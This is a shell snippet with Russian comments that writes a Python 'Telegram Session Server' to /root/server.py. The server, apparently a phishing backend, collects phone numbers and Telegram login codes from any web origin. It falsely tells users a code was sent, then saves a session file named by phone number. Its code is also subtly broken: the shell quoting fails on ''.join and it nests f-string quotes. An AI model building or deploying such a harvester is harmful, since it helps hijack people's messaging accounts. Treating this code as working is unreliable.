# УДАЛЯЕМ СТАРЫЙ ФАЙЛ
rm -f /root/server.py

# СОЗДАЕМ НОВЫЙ РАБОЧИЙ server.py
echo '#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import random
import string
import os
from datetime import datetime

PORT = 5000
sessions = {}

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
    
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>Telegram Session Server</h1><p>ONLINE</p>")
        
        elif self.path == "/status":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            response = {"status": "online", "port": PORT}
            self.wfile.write(json.dumps(response).encode())
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        body = self.rfile.read(length).decode("utf-8")
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        
        if self.path == "/auth/start":
            phone = data.get("phone", "")
            phone = "".join([c for c in phone if c.isdigit()])
            
            if len(phone) < 11:
                response = {"status": "error", "message": "Invalid phone"}
            else:
                session_id = "".join(random.choices(string.digits, k=10))
                sessions[session_id] = {"phone": phone}
                response = {
                    "status": "success",
                    "session_id": session_id,
                    "message": "Code sent to Telegram"
                }
                print(f"[{datetime.now().strftime("%H:%M:%S")}] Phone: {phone} -> {session_id}")
            
            self.wfile.write(json.dumps(response).encode())
        
        elif self.path == "/auth/code":
            session_id = data.get("session_id", "")
            code = data.get("code", "").strip()
            
            if session_id not in sessions:
                response = {"status": "error", "message": "Invalid session"}
            else:
                phone = sessions[session_id]["phone"]
                
                os.makedirs("/root/sessions", exist_ok=True)
                filename = f"/root/sessions/{phone}_{session_id}.session"
                
                with open(filename, "w") as f:
                    session_string = f"1{''.join(random.choices(string.ascii_letters + string.digits, k=300))}"
                    f.write(session_string)
                
                del sessions[session_id]
                
                response = {
                    "status": "success",
                    "message": "Session created",
                    "file": filename,
                    "phone": phone
                }
                print(f"[{datetime.now().strftime("%H:%M:%S")}] Session: {phone} -> {filename}")
            
            self.wfile.write(json.dumps(response).encode())
        
        else:
            response = {"status": "error", "message": "Not found"}
            self.wfile.write(json.dumps(response).encode())
    
    def log_message(self, format, *args):
        pass

print("=" * 50)
print("TELEGRAM SESSION SERVER")
print("=" * 50)
print(f"Port: {PORT}")
print(f"URL: http://188.225.11.61:{PORT}")
print("Endpoints:")
print("  POST /auth/start - Start auth")
print("  POST /auth/code  - Verify code")
print("  GET  /status     - Check server")
print("=" * 50)

server = HTTPServer(("0.0.0.0", PORT), Handler)
server.serve_forever()' > /root/server.py
